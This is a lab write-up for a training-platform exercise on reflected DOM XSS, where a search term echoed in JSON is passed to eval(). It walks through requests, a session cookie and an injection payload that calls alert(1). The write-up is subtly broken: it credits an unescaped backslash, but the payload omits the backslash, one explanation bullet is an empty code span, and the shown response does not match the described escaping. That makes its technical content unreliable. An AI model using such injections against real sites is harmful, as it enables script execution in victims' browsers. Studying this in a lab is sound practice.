## 12 - Reflected DOM XSS

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the alert() function.

## Notes

- Search page
- Possibility to leave a comment
- `/resources/js/searchResults.js`

## Resume

1. Capture a search request
2. Identify the reflected JSON response
3. Escape the JSON context
4. Exploit the XSS

## Solve

First, capture a search request using `Burp Suite`.

Example request:

```http
GET /search-results?search=pouet HTTP/2
Host: 0a0d00040406dbbd80d07bdc00370016.web-security-academy.net
Cookie: session=MLjOiwjv9FeSMHZgDxKjOJr9jnwUlgjX
```

Forward the request and inspect the server response:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8

{"results":[],"searchTerm":"pouet"}
```

The search parameter is reflected inside a JSON string.

Next, inspect the JavaScript file `searchResults.js` from the Site Map and observe that the JSON response is processed using:

```javascript
eval()
```

By testing different payloads, it is possible to determine that quotation marks are escaped, but backslashes are not.

Use the following payload in the search parameter:

```text
"-alert(1)}//
```

Example request:

```http
GET /search-results?search="-alert(1)}// HTTP/2
```

The generated JSON response becomes:

```json
{"searchTerm":""-alert(1)}//","results":[]}
```

Explanation:

- ``` cancels the escaping mechanism.
- The injected `"` closes the JSON string.
- `-alert(1)` executes JavaScript.
- `}//` closes the object and comments out the remaining content.

When the response is processed by `eval()`, the browser executes:

```javascript
alert(1)
```

This confirms the reflected XSS vulnerability through improper escaping inside a JSON response.